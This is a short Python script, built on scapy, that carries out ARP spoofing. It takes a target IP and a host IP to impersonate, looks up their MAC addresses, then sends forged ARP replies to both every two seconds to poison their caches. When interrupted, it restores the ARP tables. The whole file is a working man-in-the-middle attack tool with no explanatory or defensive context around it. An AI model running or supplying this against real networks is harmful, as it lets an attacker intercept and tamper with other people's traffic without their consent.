import time
#import sys
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target', dest='target', help="the target host's IP Address")
    parser.add_argument('-s', '--spoofed', dest='spoofed', help="the spoofed host's IP Address")

    options = parser.parse_args()

    if not options.target:
        parser.error('please specify a target IP')
    elif not options.spoofed:
        parser.error('please specify the spoofed IP address of the host')
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)

    scapy.send(arp_response, verbose=False)


def restore(target1_ip, target2_ip):
    target1_mac = get_mac(target1_ip)
    target2_mac = get_mac(target2_ip)
    arp_response_to_target1 = scapy.ARP(op=2, pdst=target1_ip, hwdst=target1_mac, psrc=target2_ip, hwsrc=target2_mac)
    arp_response_to_target2 = scapy.ARP(op=2, pdst=target2_ip, hwdst=target2_mac, psrc=target1_ip, hwsrc=target1_mac)
    scapy.send(arp_response_to_target1, verbose=False)
    scapy.send(arp_response_to_target2, verbose=False)


options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.spoofed)
        spoof(options.spoofed, options.target)
        sent_packets_count = sent_packets_count + 2
        print('\rpackets sent: ' + str(sent_packets_count), end='')#,
        #sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('      Detected CTRL + C .....Quitting')
    print('Restoring...')
    restore(options.target, options.spoofed)
    print('restored successfully')
